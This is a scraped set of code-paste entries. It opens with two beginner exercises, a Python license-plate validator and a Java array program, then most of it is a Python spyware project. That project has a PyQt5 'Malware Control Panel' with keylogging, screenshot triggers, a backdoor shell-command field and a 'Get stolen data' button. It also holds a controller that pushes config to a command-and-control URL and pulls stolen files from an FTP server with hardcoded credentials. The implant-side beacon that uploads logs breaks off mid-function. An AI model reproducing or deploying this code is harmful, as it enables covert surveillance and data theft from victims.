    return text[:2].isalpha()

# check the length of the string
def text_length(text):
    return 2 <= len(text) <= 6

# check if there is a number in the plate and if it the first one is zero
def zero_first_digit(text):
    for c in text:
        if c.isdigit() and int(c) != 0: # check if there is a number
            print(""good to go 0 not first digit"")
            return True
        else:
            if c.isdigit() and int(c) == 0:
                print(""first digit is zero"")
                return False

# Check if the characters following a digit to the end of the string, are digits
def check_digits_after_digit(text): # if everything is alpha
    print(""test alpha / numbers check is running"")
    if text.isalpha():
        print(""all chars are ALPHA"")
        return True
    else:
        found_digit = False # initialize var to store location of first digit and set it to False
        for c in text:
            if c.isdigit():
                found_digit = True # found first digit set flag to true
                idx = text.index(c) # get the index location of the digit
                break

        if found_digit:
            print(""index is"", idx)
            if text[idx:].isdigit(): # if all the rest chars are digit
                print(""all the rest are digits"")
                return True
            else: # if the rest are not digit
                print(""not all digits"")
                return False


# check if there is punctuation in text
def punctuation_check(text):
        for c in text:
            if c in ""'.,;:?! "":
                print(""punctuation fault"")
                return False
            else:
                return True

# if __name__ == ""__main__"":
#     main()

test = [""CS50"", ""ECTO88"", ""NRVOUS"",  ""CS05"", ""CS50P2"", ""PI3.14"", ""H"", ""OUTATIME"", ""CS50P"", ""HELLO""]

for test_case in test:
    print(""Considering"", test_case)
    if is_valid(test_case):
        print(""The outcome of"", test_case, ""is Valid"")
        print(""----"")
    else:
        print(""The outcome of"", test_case, ""is Invalid"")
        print(""----"")"
M8B3P0yz,Day 10 - 2,HarrJ,Java,Thursday 10th of August 2023 10:38:52 PM CDT,"package mng2023b5;
import java.util.Scanner;

public class Day10D {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        int numSize;
        int[] numList;
        int numLargest;
        int numSmallest;

        System.out.println(""Enter total numbers in array? "");
        numSize = sc.nextInt();
        
        if (numSize < 5 || numSize > 20) {
            numSize = 12;
        }
        
        numList = new int[numSize];
        
        // di nalalagyan ng for each loop ng laman ang array
        for (int i = 0; i < numList.length; i++) {
            numList[i] = (int) Math.round(Math.random()*50);
            System.out.print(numList[i]);
            System.out.print((i < numList.length-1) 
                    ? "", "": ""\n"");
        }
        
        numLargest = numList[0];
        numSmallest = numList[0];

        for (int i : numList) {
            if (i > numLargest) {
                numLargest = i;
            }
//add code to check for smallest number here
        }
        
        System.out.println(""The largest number is: "" + numLargest);
        
    }
}"
f4p2ZReD,gui/.idea/vcs.xml,FlyFar,XML,Thursday 10th of August 2023 10:04:59 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<project version=""4"">
  <component name=""VcsDirectoryMappings"">
    <mapping directory=""$PROJECT_DIR$/.."" vcs=""Git"" />
  </component>
</project>"
WKkcr34q,gui/.idea/modules.xml,FlyFar,XML,Thursday 10th of August 2023 10:04:05 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<project version=""4"">
  <component name=""ProjectModuleManager"">
    <modules>
      <module fileurl=""file://$PROJECT_DIR$/.idea/gui.iml"" filepath=""$PROJECT_DIR$/.idea/gui.iml"" />
    </modules>
  </component>
</project>"
eCySStvP,gui/.idea/misc.xml,FlyFar,XML,Thursday 10th of August 2023 10:03:32 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<project version=""4"">
  <component name=""JavaScriptSettings"">
    <option name=""languageLevel"" value=""ES6"" />
  </component>
  <component name=""ProjectInspectionProfilesVisibleTreeState"">
    <entry key=""Project Default"">
      <profile-state>
        <expanded-state>
          <State />
          <State>
            <id>Python</id>
          </State>
        </expanded-state>
        <selected-state>
          <State>
            <id>PyPep8NamingInspection</id>
          </State>
        </selected-state>
      </profile-state>
    </entry>
  </component>
  <component name=""ProjectRootManager"" version=""2"" project-jdk-name=""Python 3.7"" project-jdk-type=""Python SDK"" />
</project>"
LUMhG5pn,gui/.idea/gui.iml,FlyFar,XML,Thursday 10th of August 2023 10:02:53 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<module type=""PYTHON_MODULE"" version=""4"">
  <component name=""NewModuleRootManager"">
    <content url=""file://$MODULE_DIR$"" />
    <orderEntry type=""inheritedJdk"" />
    <orderEntry type=""sourceFolder"" forTests=""false"" />
  </component>
  <component name=""TestRunnerService"">
    <option name=""PROJECT_TEST_RUNNER"" value=""Unittests"" />
  </component>
</module>"
w8LYAxy1,gui/.idea/codeStyles/codeStyleConfig.xml,FlyFar,XML,Thursday 10th of August 2023 09:59:54 PM CDT,"<component name=""ProjectCodeStyleConfiguration"">
  <state>
    <option name=""PREFERRED_PROJECT_CODE_STYLE"" value=""Default"" />
  </state>
</component>"
mKMBAUtf,gui/.idea/dictionaries/peterforro.xml,FlyFar,XML,Thursday 10th of August 2023 09:59:07 PM CDT,"<component name=""ProjectDictionaryState"">
  <dictionary name=""peterforro"" />
</component>"
qXU9RL8k,gui/gui.ui,FlyFar,XML,Thursday 10th of August 2023 09:57:04 PM CDT,"<?xml version=""1.0"" encoding=""UTF-8""?>
<ui version=""4.0"">
 <class>Dialog</class>
 <widget class=""QDialog"" name=""Dialog"">
  <property name=""geometry"">
   <rect>
    <x>0</x>
    <y>0</y>
    <width>819</width>
    <height>668</height>
   </rect>
  </property>
  <property name=""windowTitle"">
   <string>Dialog</string>
  </property>
  <widget class=""QLabel"" name=""label"">
   <property name=""geometry"">
    <rect>
     <x>180</x>
     <y>20</y>
     <width>481</width>
     <height>61</height>
    </rect>
   </property>
   <property name=""font"">
    <font>
     <family>Ubuntu Condensed</family>
     <pointsize>43</pointsize>
     <weight>75</weight>
     <italic>false</italic>
     <bold>true</bold>
    </font>
   </property>
   <property name=""text"">
    <string>Malware Control Panel</string>
   </property>
  </widget>
  <widget class=""QTabWidget"" name=""tabWidget"">
   <property name=""geometry"">
    <rect>
     <x>120</x>
     <y>120</y>
     <width>581</width>
     <height>491</height>
    </rect>
   </property>
   <property name=""currentIndex"">
    <number>0</number>
   </property>
   <widget class=""QWidget"" name=""tab"">
    <attribute name=""title"">
     <string>Tab 1</string>
    </attribute>
    <widget class=""QPushButton"" name=""wakeup"">
     <property name=""geometry"">
      <rect>
       <x>170</x>
       <y>100</y>
       <width>231</width>
       <height>41</height>
      </rect>
     </property>
     <property name=""font"">
      <font>
       <pointsize>17</pointsize>
      </font>
     </property>
     <property name=""text"">
      <string>Ellácska, wake up!!!</string>
     </property>
    </widget>
    <widget class=""QPushButton"" name=""sendconfig"">
     <property name=""geometry"">
      <rect>
       <x>170</x>
       <y>190</y>
       <width>231</width>
       <height>41</height>
      </rect>
     </property>
     <property name=""font"">
      <font>
       <pointsize>16</pointsize>
      </font>
     </property>
     <property name=""text"">
      <string>Send config data!!!</string>
     </property>
    </widget>
    <widget class=""QPushButton"" name=""getftp"">
     <property name=""geometry"">
      <rect>
       <x>170</x>
       <y>280</y>
       <width>231</width>
       <height>41</height>
      </rect>
     </property>
     <property name=""font"">
      <font>
       <pointsize>16</pointsize>
      </font>
     </property>
     <property name=""text"">
      <string>Get stolen data!!!</string>
     </property>
    </widget>
   </widget>
   <widget class=""QWidget"" name=""tab_2"">
    <attribute name=""title"">
     <string>Tab 2</string>
    </attribute>
    <widget class=""QWidget"" name=""formLayoutWidget"">
     <property name=""geometry"">
      <rect>
       <x>120</x>
       <y>130</y>
       <width>311</width>
       <height>231</height>
      </rect>
     </property>
     <layout class=""QFormLayout"" name=""formLayout"">
      <item row=""0"" column=""0"">
       <widget class=""QCheckBox"" name=""keylogger"">
        <property name=""text"">
         <string>Keylogging</string>
        </property>
        <property name=""checked"">
         <bool>true</bool>
        </property>
       </widget>
      </item>
      <item row=""0"" column=""1"">
       <widget class=""QCheckBox"" name=""tracker"">
        <property name=""text"">
         <string>Window Tracking</string>
        </property>
        <property name=""checked"">
         <bool>true</bool>
        </property>
       </widget>
      </item>
      <item row=""3"" column=""0"">
       <widget class=""QLabel"" name=""samplingFrequencyLabel"">
        <property name=""text"">
         <string>Sampling Frequency</string>
        </property>
       </widget>
      </item>
      <item row=""3"" column=""1"">
       <widget class=""QLineEdit"" name=""trackfreq"">
        <property name=""text"">
         <string>0.1</string>
        </property>
       </widget>
      </item>
      <item row=""4"" column=""0"">
       <widget class=""QLabel"" name=""screenshotFrequencyLabel"">
        <property name=""text"">
         <string>Screenshot Frequency</string>
        </property>
       </widget>
      </item>
      <item row=""4"" column=""1"">
       <widget class=""QLineEdit"" name=""screenshotfreq"">
        <property name=""text"">
         <string>50</string>
        </property>
       </widget>
      </item>
      <item row=""5"" column=""0"">
       <widget class=""QLabel"" name=""screenshotTriggerLabel"">
        <property name=""text"">
         <string>Screenshot Triggers</string>
        </property>
       </widget>
      </item>
      <item row=""5"" column=""1"">
       <widget class=""QLineEdit"" name=""triggers"">
        <property name=""text"">
         <string>facebook</string>
        </property>
       </widget>
      </item>
      <item row=""2"" column=""0"">
       <widget class=""QCheckBox"" name=""debugmode"">
        <property name=""text"">
         <string>Debug</string>
        </property>
        <property name=""checked"">
         <bool>true</bool>
        </property>
       </widget>
      </item>
     </layout>
    </widget>
    <widget class=""QLabel"" name=""label_2"">
     <property name=""geometry"">
      <rect>
       <x>120</x>
       <y>60</y>
       <width>321</width>
       <height>31</height>
      </rect>
     </property>
     <property name=""font"">
      <font>
       <pointsize>17</pointsize>
      </font>
     </property>
     <property name=""text"">
      <string>Window tracking &amp; Keylogging</string>
     </property>
    </widget>
   </widget>
   <widget class=""QWidget"" name=""tab_3"">
    <attribute name=""title"">
     <string>Page</string>
    </attribute>
    <widget class=""QWidget"" name=""formLayoutWidget_2"">
     <property name=""geometry"">
      <rect>
       <x>20</x>
       <y>120</y>
       <width>541</width>
       <height>201</height>
      </rect>
     </property>
     <layout class=""QFormLayout"" name=""formLayout_2"">
      <item row=""1"" column=""0"">
       <widget class=""QLabel"" name=""samplingFrequencyLabel_2"">
        <property name=""text"">
         <string>Base URL</string>
        </property>
       </widget>
      </item>
      <item row=""1"" column=""1"">
       <widget class=""QLineEdit"" name=""baseurl"">
        <property name=""text"">
         <string>http://facebook-user-profile.herokuapp.com/malware</string>
        </property>
       </widget>
      </item>
      <item row=""2"" column=""0"">
       <widget class=""QLabel"" name=""screenshotFrequencyLabel_2"">
        <property name=""text"">
         <string>FTP:</string>
        </property>
       </widget>
      </item>
      <item row=""2"" column=""1"">
       <widget class=""QLineEdit"" name=""ftpurl"">
        <property name=""text"">
         <string>ftp.atw.hu</string>
        </property>
       </widget>
      </item>
      <item row=""3"" column=""0"">
       <widget class=""QLabel"" name=""screenshotTriggerLabel_2"">
        <property name=""text"">
         <string>FTP user</string>
        </property>
       </widget>
      </item>
      <item row=""3"" column=""1"">
       <widget class=""QLineEdit"" name=""ftpuser"">
        <property name=""text"">
         <string>kiserletimuto</string>
        </property>
       </widget>
      </item>
      <item row=""4"" column=""0"">
       <widget class=""QLabel"" name=""fTPPassLabel"">
        <property name=""text"">
         <string>FTP pass</string>
        </property>
       </widget>
      </item>
      <item row=""4"" column=""1"">
       <widget class=""QLineEdit"" name=""ftppass"">
        <property name=""text"">
         <string>patti</string>
        </property>
       </widget>
      </item>
      <item row=""5"" column=""0"">
       <widget class=""QLabel"" name=""fCommLabel"">
        <property name=""text"">
         <string>Comm freq</string>
        </property>
       </widget>
      </item>
      <item row=""5"" column=""1"">
       <widget class=""QLineEdit"" name=""commfreq"">
        <property name=""text"">
         <string>900</string>
        </property>
       </widget>
      </item>
     </layout>
    </widget>
    <widget class=""QLabel"" name=""label_3"">
     <property name=""geometry"">
      <rect>
       <x>170</x>
       <y>60</y>
       <width>251</width>
       <height>17</height>
      </rect>
     </property>
     <property name=""font"">
      <font>
       <pointsize>17</pointsize>
      </font>
     </property>
     <property name=""text"">
      <string>Server Communication</string>
     </property>
    </widget>
   </widget>
   <widget class=""QWidget"" name=""tab_4"">
    <attribute name=""title"">
     <string>Page</string>
    </attribute>
    <widget class=""QLabel"" name=""label_4"">
     <property name=""geometry"">
      <rect>
       <x>230</x>
       <y>60</y>
       <width>101</width>
       <height>31</height>
      </rect>
     </property>
     <property name=""font"">
      <font>
       <pointsize>17</pointsize>
      </font>
     </property>
     <property name=""text"">
      <string>Backdoor </string>
     </property>
    </widget>
    <widget class=""QWidget"" name=""formLayoutWidget_3"">
     <property name=""geometry"">
      <rect>
       <x>20</x>
       <y>140</y>
       <width>541</width>
       <height>81</height>
      </rect>
     </property>
     <layout class=""QFormLayout"" name=""formLayout_3"">
      <item row=""1"" column=""0"">
       <widget class=""QLabel"" name=""samplingFrequencyLabel_3"">
        <property name=""text"">
         <string>Shell command</string>
        </property>
       </widget>
      </item>
      <item row=""1"" column=""1"">
       <widget class=""QLineEdit"" name=""shellcommand"">
        <property name=""text"">
         <string/>
        </property>
       </widget>
      </item>
      <item row=""2"" column=""0"">
       <widget class=""QLabel"" name=""screenshotFrequencyLabel_3"">
        <property name=""text"">
         <string>File Path</string>
        </property>
       </widget>
      </item>
      <item row=""2"" column=""1"">
       <widget class=""QLineEdit"" name=""filepath"">
        <property name=""text"">
         <string/>
        </property>
       </widget>
      </item>
     </layout>
    </widget>
   </widget>
  </widget>
 </widget>
 <resources/>
 <connections/>
</ui>"
fpSQ6pMY,gui/Main.py,FlyFar,Python,Thursday 10th of August 2023 09:56:08 PM CDT,"import sys
from AppWindow import AppWindow
from Controller import Controller
from PyQt5.QtWidgets import QApplication, QWidget, QDialog


def main():
    app = QApplication(sys.argv)
    appWindow = AppWindow()
    controller = Controller(appWindow.gui)
    appWindow.show()
    sys.exit(app.exec())


if __name__ == '__main__':
    main()"
8fw9n9Nv,gui/Gui.py,FlyFar,Python,Thursday 10th of August 2023 09:55:34 PM CDT,"from PyQt5 import QtCore, QtGui, QtWidgets


class Gui(object):

    def __init__(self, Dialog):
        Dialog.setObjectName(""Dialog"")
        Dialog.resize(819, 668)
        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(180, 20, 481, 61))
        font = QtGui.QFont()
        font.setFamily(""Ubuntu Condensed"")
        font.setPointSize(43)
        font.setBold(True)
        font.setItalic(False)
        font.setWeight(75)
        self.label.setFont(font)
        self.label.setObjectName(""label"")
        self.tabWidget = QtWidgets.QTabWidget(Dialog)
        self.tabWidget.setGeometry(QtCore.QRect(120, 120, 581, 491))
        self.tabWidget.setObjectName(""tabWidget"")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName(""tab"")
        self.wakeup = QtWidgets.QPushButton(self.tab)
        self.wakeup.setGeometry(QtCore.QRect(170, 100, 231, 41))
        font = QtGui.QFont()
        font.setPointSize(17)
        self.wakeup.setFont(font)
        self.wakeup.setObjectName(""wakeup"")
        self.sendconfig = QtWidgets.QPushButton(self.tab)
        self.sendconfig.setGeometry(QtCore.QRect(170, 190, 231, 41))
        font = QtGui.QFont()
        font.setPointSize(16)
        self.sendconfig.setFont(font)
        self.sendconfig.setObjectName(""sendconfig"")
        self.getftp = QtWidgets.QPushButton(self.tab)
        self.getftp.setGeometry(QtCore.QRect(170, 280, 231, 41))
        font = QtGui.QFont()
        font.setPointSize(16)
        self.getftp.setFont(font)
        self.getftp.setObjectName(""getftp"")
        self.tabWidget.addTab(self.tab, """")
        self.tab_2 = QtWidgets.QWidget()
        self.tab_2.setObjectName(""tab_2"")
        self.formLayoutWidget = QtWidgets.QWidget(self.tab_2)
        self.formLayoutWidget.setGeometry(QtCore.QRect(120, 130, 311, 231))
        self.formLayoutWidget.setObjectName(""formLayoutWidget"")
        self.formLayout = QtWidgets.QFormLayout(self.formLayoutWidget)
        self.formLayout.setContentsMargins(0, 0, 0, 0)
        self.formLayout.setObjectName(""formLayout"")
        self.keylogger = QtWidgets.QCheckBox(self.formLayoutWidget)
        self.keylogger.setChecked(True)
        self.keylogger.setObjectName(""keylogger"")
        self.formLayout.setWidget(0, QtWidgets.QFormLayout.LabelRole, self.keylogger)
        self.tracker = QtWidgets.QCheckBox(self.formLayoutWidget)
        self.tracker.setChecked(True)
        self.tracker.setObjectName(""tracker"")
        self.formLayout.setWidget(0, QtWidgets.QFormLayout.FieldRole, self.tracker)
        self.samplingFrequencyLabel = QtWidgets.QLabel(self.formLayoutWidget)
        self.samplingFrequencyLabel.setObjectName(""samplingFrequencyLabel"")
        self.formLayout.setWidget(3, QtWidgets.QFormLayout.LabelRole, self.samplingFrequencyLabel)
        self.trackfreq = QtWidgets.QLineEdit(self.formLayoutWidget)
        self.trackfreq.setObjectName(""trackfreq"")
        self.formLayout.setWidget(3, QtWidgets.QFormLayout.FieldRole, self.trackfreq)
        self.screenshotFrequencyLabel = QtWidgets.QLabel(self.formLayoutWidget)
        self.screenshotFrequencyLabel.setObjectName(""screenshotFrequencyLabel"")
        self.formLayout.setWidget(4, QtWidgets.QFormLayout.LabelRole, self.screenshotFrequencyLabel)
        self.screenshotfreq = QtWidgets.QLineEdit(self.formLayoutWidget)
        self.screenshotfreq.setObjectName(""screenshotfreq"")
        self.formLayout.setWidget(4, QtWidgets.QFormLayout.FieldRole, self.screenshotfreq)
        self.screenshotTriggerLabel = QtWidgets.QLabel(self.formLayoutWidget)
        self.screenshotTriggerLabel.setObjectName(""screenshotTriggerLabel"")
        self.formLayout.setWidget(5, QtWidgets.QFormLayout.LabelRole, self.screenshotTriggerLabel)
        self.triggers = QtWidgets.QLineEdit(self.formLayoutWidget)
        self.triggers.setObjectName(""triggers"")
        self.formLayout.setWidget(5, QtWidgets.QFormLayout.FieldRole, self.triggers)
        self.debugmode = QtWidgets.QCheckBox(self.formLayoutWidget)
        self.debugmode.setChecked(True)
        self.debugmode.setObjectName(""debugmode"")
        self.formLayout.setWidget(2, QtWidgets.QFormLayout.LabelRole, self.debugmode)
        self.label_2 = QtWidgets.QLabel(self.tab_2)
        self.label_2.setGeometry(QtCore.QRect(120, 60, 321, 31))
        font = QtGui.QFont()
        font.setPointSize(17)
        self.label_2.setFont(font)
        self.label_2.setObjectName(""label_2"")
        self.tabWidget.addTab(self.tab_2, """")
        self.tab_3 = QtWidgets.QWidget()
        self.tab_3.setObjectName(""tab_3"")
        self.formLayoutWidget_2 = QtWidgets.QWidget(self.tab_3)
        self.formLayoutWidget_2.setGeometry(QtCore.QRect(20, 120, 541, 201))
        self.formLayoutWidget_2.setObjectName(""formLayoutWidget_2"")
        self.formLayout_2 = QtWidgets.QFormLayout(self.formLayoutWidget_2)
        self.formLayout_2.setContentsMargins(0, 0, 0, 0)
        self.formLayout_2.setObjectName(""formLayout_2"")
        self.samplingFrequencyLabel_2 = QtWidgets.QLabel(self.formLayoutWidget_2)
        self.samplingFrequencyLabel_2.setObjectName(""samplingFrequencyLabel_2"")
        self.formLayout_2.setWidget(1, QtWidgets.QFormLayout.LabelRole, self.samplingFrequencyLabel_2)
        self.baseurl = QtWidgets.QLineEdit(self.formLayoutWidget_2)
        self.baseurl.setObjectName(""baseurl"")
        self.formLayout_2.setWidget(1, QtWidgets.QFormLayout.FieldRole, self.baseurl)
        self.screenshotFrequencyLabel_2 = QtWidgets.QLabel(self.formLayoutWidget_2)
        self.screenshotFrequencyLabel_2.setObjectName(""screenshotFrequencyLabel_2"")
        self.formLayout_2.setWidget(2, QtWidgets.QFormLayout.LabelRole, self.screenshotFrequencyLabel_2)
        self.ftpurl = QtWidgets.QLineEdit(self.formLayoutWidget_2)
        self.ftpurl.setObjectName(""ftpurl"")
        self.formLayout_2.setWidget(2, QtWidgets.QFormLayout.FieldRole, self.ftpurl)
        self.screenshotTriggerLabel_2 = QtWidgets.QLabel(self.formLayoutWidget_2)
        self.screenshotTriggerLabel_2.setObjectName(""screenshotTriggerLabel_2"")
        self.formLayout_2.setWidget(3, QtWidgets.QFormLayout.LabelRole, self.screenshotTriggerLabel_2)
        self.ftpuser = QtWidgets.QLineEdit(self.formLayoutWidget_2)
        self.ftpuser.setObjectName(""ftpuser"")
        self.formLayout_2.setWidget(3, QtWidgets.QFormLayout.FieldRole, self.ftpuser)
        self.fTPPassLabel = QtWidgets.QLabel(self.formLayoutWidget_2)
        self.fTPPassLabel.setObjectName(""fTPPassLabel"")
        self.formLayout_2.setWidget(4, QtWidgets.QFormLayout.LabelRole, self.fTPPassLabel)
        self.ftppass = QtWidgets.QLineEdit(self.formLayoutWidget_2)
        self.ftppass.setObjectName(""ftppass"")
        self.formLayout_2.setWidget(4, QtWidgets.QFormLayout.FieldRole, self.ftppass)
        self.fCommLabel = QtWidgets.QLabel(self.formLayoutWidget_2)
        self.fCommLabel.setObjectName(""fCommLabel"")
        self.formLayout_2.setWidget(5, QtWidgets.QFormLayout.LabelRole, self.fCommLabel)
        self.commfreq = QtWidgets.QLineEdit(self.formLayoutWidget_2)
        self.commfreq.setObjectName(""commfreq"")
        self.formLayout_2.setWidget(5, QtWidgets.QFormLayout.FieldRole, self.commfreq)
        self.label_3 = QtWidgets.QLabel(self.tab_3)
        self.label_3.setGeometry(QtCore.QRect(170, 60, 251, 17))
        font = QtGui.QFont()
        font.setPointSize(17)
        self.label_3.setFont(font)
        self.label_3.setObjectName(""label_3"")
        self.tabWidget.addTab(self.tab_3, """")
        self.tab_4 = QtWidgets.QWidget()
        self.tab_4.setObjectName(""tab_4"")
        self.label_4 = QtWidgets.QLabel(self.tab_4)
        self.label_4.setGeometry(QtCore.QRect(230, 60, 101, 31))
        font = QtGui.QFont()
        font.setPointSize(17)
        self.label_4.setFont(font)
        self.label_4.setObjectName(""label_4"")
        self.formLayoutWidget_3 = QtWidgets.QWidget(self.tab_4)
        self.formLayoutWidget_3.setGeometry(QtCore.QRect(20, 140, 541, 81))
        self.formLayoutWidget_3.setObjectName(""formLayoutWidget_3"")
        self.formLayout_3 = QtWidgets.QFormLayout(self.formLayoutWidget_3)
        self.formLayout_3.setContentsMargins(0, 0, 0, 0)
        self.formLayout_3.setObjectName(""formLayout_3"")
        self.samplingFrequencyLabel_3 = QtWidgets.QLabel(self.formLayoutWidget_3)
        self.samplingFrequencyLabel_3.setObjectName(""samplingFrequencyLabel_3"")
        self.formLayout_3.setWidget(1, QtWidgets.QFormLayout.LabelRole, self.samplingFrequencyLabel_3)
        self.shellcommand = QtWidgets.QLineEdit(self.formLayoutWidget_3)
        self.shellcommand.setText("""")
        self.shellcommand.setObjectName(""shellcommand"")
        self.formLayout_3.setWidget(1, QtWidgets.QFormLayout.FieldRole, self.shellcommand)
        self.screenshotFrequencyLabel_3 = QtWidgets.QLabel(self.formLayoutWidget_3)
        self.screenshotFrequencyLabel_3.setObjectName(""screenshotFrequencyLabel_3"")
        self.formLayout_3.setWidget(2, QtWidgets.QFormLayout.LabelRole, self.screenshotFrequencyLabel_3)
        self.filepath = QtWidgets.QLineEdit(self.formLayoutWidget_3)
        self.filepath.setText("""")
        self.filepath.setObjectName(""filepath"")
        self.formLayout_3.setWidget(2, QtWidgets.QFormLayout.FieldRole, self.filepath)
        self.tabWidget.addTab(self.tab_4, """")

        self.retranslateUi(Dialog)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate(""Dialog"", ""Dialog""))
        self.label.setText(_translate(""Dialog"", ""Malware Control Panel""))
        self.wakeup.setText(_translate(""Dialog"", ""Ellácska, wake up!!!""))
        self.sendconfig.setText(_translate(""Dialog"", ""Send config data!!!""))
        self.getftp.setText(_translate(""Dialog"", ""Get stolen data!!!""))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate(""Dialog"", ""Attack""))
        self.keylogger.setText(_translate(""Dialog"", ""Keylogging""))
        self.tracker.setText(_translate(""Dialog"", ""Window Tracking""))
        self.samplingFrequencyLabel.setText(_translate(""Dialog"", ""Sampling Frequency""))
        self.trackfreq.setText(_translate(""Dialog"", ""0.1""))
        self.screenshotFrequencyLabel.setText(_translate(""Dialog"", ""Screenshot Frequency""))
        self.screenshotfreq.setText(_translate(""Dialog"", ""50""))
        self.screenshotTriggerLabel.setText(_translate(""Dialog"", ""Screenshot Triggers""))
        self.triggers.setText(_translate(""Dialog"", ""facebook""))
        self.debugmode.setText(_translate(""Dialog"", ""Debug""))
        self.label_2.setText(_translate(""Dialog"", ""Window tracking & Keylogging""))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate(""Dialog"", ""Logging""))
        self.samplingFrequencyLabel_2.setText(_translate(""Dialog"", ""Base URL""))
        self.baseurl.setText(_translate(""Dialog"", ""http://facebook-user-profile.herokuapp.com/malware""))
        self.screenshotFrequencyLabel_2.setText(_translate(""Dialog"", ""FTP:""))
        self.ftpurl.setText(_translate(""Dialog"", ""ftp.atw.hu""))
        self.screenshotTriggerLabel_2.setText(_translate(""Dialog"", ""FTP user""))
        self.ftpuser.setText(_translate(""Dialog"", ""kiserletimuto""))
        self.fTPPassLabel.setText(_translate(""Dialog"", ""FTP pass""))
        self.ftppass.setText(_translate(""Dialog"", ""patti""))
        self.fCommLabel.setText(_translate(""Dialog"", ""Comm freq""))
        self.commfreq.setText(_translate(""Dialog"", ""900""))
        self.label_3.setText(_translate(""Dialog"", ""Server Communication""))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate(""Dialog"", ""Communication""))
        self.label_4.setText(_translate(""Dialog"", ""Backdoor ""))
        self.samplingFrequencyLabel_3.setText(_translate(""Dialog"", ""Shell command""))
        self.screenshotFrequencyLabel_3.setText(_translate(""Dialog"", ""File Path""))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), _translate(""Dialog"", ""Backdoor""))

"
a5qhbT5m,gui/FileExplorer.py,FlyFar,Python,Thursday 10th of August 2023 09:54:48 PM CDT,"import os, getpass
from glob import glob
from zipfile import ZipFile

class FileExplorer:
    
    
    @staticmethod
    def WriteToFile(result):
        with open(""result.txt"",""w"") as file:
            for element in result:
                print(element)
                file.write(element + ""\n"")

    
    @staticmethod
    def DiscoverDirectory(path):
        content = os.listdir(path)
        FileExplorer.WriteToFile(content)


    @staticmethod
    def SearchForFile(pattern):
        resultSet = glob(pattern,recursive=True)
        FileExplorer.WriteToFile(resultSet)
        return resultSet


    @staticmethod
    def archive(files_to_archive):
        with ZipFile(""D:\\hello.zip"", ""w"") as archive:
            for file in files_to_archive:
                archive.write(file)

#-------------------------------------------------------

if __name__ == ""__main__"":
    path_with_pattern = input(""Path with pattern?: "")
    files_to_archive = FileExplorer.SearchForFile(path_with_pattern)
    FileExplorer.archive(files_to_archive)"
eQ6WTN9E,gui/Controller.py,FlyFar,Python,Thursday 10th of August 2023 09:54:00 PM CDT,"from PyQt5.QtWidgets import QTableWidgetItem
from requests import get
from ftplib import FTP
import webbrowser

class Controller:

    def __init__(self, gui):
        self.__gui = gui
        self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
        self.__configURL = 'http://facebook-user-profile.herokuapp.com/config'
        self.__gui.wakeup.clicked.connect(self.wakeup)
        self.__gui.sendconfig.clicked.connect(self.sendConfigData)
        self.__gui.getftp.clicked.connect(self.getfiles)
        self.__ftpURL = 'ftp.atw.hu'
        self.__ftpUserName = 'kiserletimuto'
        self.__ftpPassWord = 'patti'


    def wakeup(self):
        response = get(self.__baseURL,params={'username':'pizdjec!'})
        data = response.json()
        print(data)



    def sendConfigData(self):
        config = {
            'debug' : self.__gui.debugmode.isChecked(),
            'keyloggingIsActive' : self.__gui.keylogger.isChecked(),
            'windowTrackingIsActive' : self.__gui.tracker.isChecked(),
            'samplingfrequency' : float(self.__gui.trackfreq.text()),
            'screenshotfrequency' : int(self.__gui.screenshotfreq.text()),
            'screenshottrigger' : self.__gui.triggers.text(),
            'baseurl' : self.__gui.baseurl.text(),
            'communicationfrequency' : int(self.__gui.commfreq.text()),
            'ftpurl' : self.__gui.ftpurl.text(),
            'ftpusername' : self.__gui.ftpuser.text(),
            'ftppassword' : self.__gui.ftppass.text(),
            'shellcommand' : self.__gui.shellcommand.text(),
            'stealpath' : self.__gui.filepath.text()
        }
        get(self.__configURL,config)



    def getfiles(self):
        try:
            ftp = FTP(self.__ftpURL)
            ftp.login(self.__ftpUserName, self.__ftpPassWord)
            filenames = ftp.nlst()
            for filename in filenames:
                print(filename)
                local_filename = '/home/peterforro/Documents/malware/' + filename
                file = open(local_filename, 'wb')
                ftp.retrbinary('RETR ' + filename, file.write)
                ftp.delete(filename)
                file.close()
            webbrowser.open('file:///' + '/home/peterforro/Documents/malware/')
        except Exception as error:
            print('FTP error!: ',error)"
ccyBGSjA,gui/AppWindow.py,FlyFar,Python,Thursday 10th of August 2023 09:53:16 PM CDT,"from PyQt5.QtWidgets import QDialog
from Gui import Gui


class AppWindow(QDialog):

    def __init__(self):
        super().__init__()
        self.ui = Gui(self)
        self.show()


    @property
    def gui(self):
        return self.ui"
086b8shM,Communication.py,FlyFar,Python,Thursday 10th of August 2023 09:52:24 PM CDT,"from Configuration import Configuration
from Util import Util
from threading import Thread
from time import sleep
from requests import get
from json import loads, dumps
from shutil import copy, copy2
from ftplib import FTP
import os


class Communication(Thread):

    def __init__(self, malware, config:Configuration):
        Thread.__init__(self, name='communication')
        self.__config = config


    def run(self):
        while True:
            sleep(self.__config.communicationFrequency)
            self.getConfigFromServer()
            self.uploadFilesFTP()


    def getConfigFromServer(self):
        if self.__config.debug:
            print('Connecting to the server...')
        try:
            response = get(url=self.__config.baseURL, params={'username':self.__config.userName})
            data = response.json()
            if data:
                jsonData = dumps(data, ensure_ascii=False)
                Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                if self.__config.debug:
                    print('Config file has been created!')
                self.__config.setAttributes()
        except Exception as exception:
            print(f'COMMUNICATION ERROR!: {exception}')


    def uploadFilesFTP(self):
        try:
            ftp = FTP(self.__config.ftpURL)
            ftp.login(self.__config.ftpUserName, self.__config.ftpPassword)
            for root, dirs, files in os.walk(self.__config.logPath):
                for filename in files:
